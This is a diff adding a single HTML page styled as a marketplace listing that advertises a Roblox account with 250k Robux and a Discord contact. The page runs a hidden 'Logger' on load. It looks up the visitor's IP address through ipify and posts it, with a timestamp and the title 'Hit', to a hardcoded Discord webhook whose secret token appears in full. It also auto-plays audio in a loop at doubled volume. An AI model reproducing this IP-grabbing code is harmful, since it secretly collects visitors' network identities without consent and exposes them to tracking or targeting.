@@ -1,0 +1,132 @@
+<!-- by cometzzz -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cometzzz</title>
+    <link rel="icon" type="image/jpg" href="https://i.pinimg.com/736x/e4/e5/a5/e4e5a50ed0eeac4f5ba23f88ba4475eb.jpg">
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap');
+        body { background-color: #000; overflow: hidden; font-family: 'Inter', sans-serif; }
+        .bg-gif {
+            background-image: url('https://i.pinimg.com/originals/e2/66/13/e266138bb630631635e4733cd5a5e6f5.gif');
+            background-size: cover;
+            background-position: center;
+            filter: blur(12px) brightness(0.4);
+            transform: scale(1.1);
+        }
+        .glass {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+    <script type="text/babel">
+        const { useEffect, useRef } = React;
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1468335298307035393/gCtEm66wNNSUa0rw3fAn-JY79qhzLgeOZU93_SX6Sv247LoNDh4-pKCe87T-Lt9R9Zb9";
+
+        const App = () => {
+            const mainRef = useRef(null);
+
+            useEffect(() => {
+                // UI Animation
+                gsap.fromTo(mainRef.current, { opacity: 0, y: 10 }, { opacity: 1, y: 0, duration: 1.5, ease: "power4.out", delay: 0.2 });
+
+                // Audio System (200% Vol + Loop)
+                const initAudio = async () => {
+                    try {
+                        const AudioContext = window.AudioContext || window.webkitAudioContext;
+                        if (!AudioContext) return;
+                        
+                        const ctx = new AudioContext();
+                        const gainNode = ctx.createGain();
+                        gainNode.gain.value = 2.0; // 200% Volume
+                        gainNode.connect(ctx.destination);
+
+                        const response = await fetch('cometzzz.mp3');
+                        const arrayBuffer = await response.arrayBuffer();
+                        const audioBuffer = await ctx.decodeAudioData(arrayBuffer);
+
+                        const play = () => {
+                            const source = ctx.createBufferSource();
+                            source.buffer = audioBuffer;
+                            source.loop = true;
+                            source.connect(gainNode);
+                            source.start(0);
+                        };
+
+                        if (ctx.state === 'suspended') {
+                            const unlock = () => {
+                                ctx.resume().then(() => {
+                                    play();
+                                    document.removeEventListener('click', unlock);
+                                    document.removeEventListener('keydown', unlock);
+                                    document.removeEventListener('touchstart', unlock);
+                                });
+                            };
+                            ['click', 'keydown', 'touchstart'].forEach(e => document.addEventListener(e, unlock));
+                        } else {
+                            play();
+                        }
+                    } catch (e) {
+                        // Silent fail
+                    }
+                };
+                initAudio();
+
+                // Logger
+                const log = async () => {
+                    try {
+                        const ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                username: "cometzzz",
+                                avatar_url: "https://i.pinimg.com/736x/e4/e5/a5/e4e5a50ed0eeac4f5ba23f88ba4475eb.jpg",
+                                embeds: [{
+                                    title: "Hit",
+                                    color: 0,
+                                    description: `IP: \`${ip}\`\nTime: ${new Date().toISOString()}`
+                                }]
+                            })
+                        });
+                    } catch {}
+                };
+                log();
+            }, []);
+
+            return (
+                <div className="w-full h-screen flex justify-center items-center text-gray-300 select-none cursor-default">
+                    <div className="absolute inset-0 bg-gif z-0"></div>
+                    <div className="absolute inset-0 bg-black/70 z-0"></div>
+                    
+                    <div ref={mainRef} className="relative z-10 text-center opacity-0 glass p-10 rounded-sm">
+                        <h1 className="text-white text-sm tracking-[0.2em] font-medium mb-8 uppercase opacity-80">Marketplace</h1>
+                        
+                        <div className="space-y-4 text-xs tracking-widest font-light leading-relaxed">
+                            <p className="uppercase">Roblox Account // 250k Robux</p>
+                            <div className="w-8 h-[1px] bg-white/20 mx-auto my-6"></div>
+                            <p>DISCORD: <span className="text-white font-normal">cometzzz_</span></p>
+                            <p>SERVER: <a href="https://discord.gg/Qw3eueBx3k" target="_blank" className="text-white hover:text-gray-400 transition-colors duration-300">discord.gg/Qw3eueBx3k</a></p>
+                        </div>
+
+                        <div className="mt-12 text-[10px] text-gray-600 tracking-[0.3em]">COMETZZZ</div>
+                    </div>
+                </div>
+            );
+        };
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
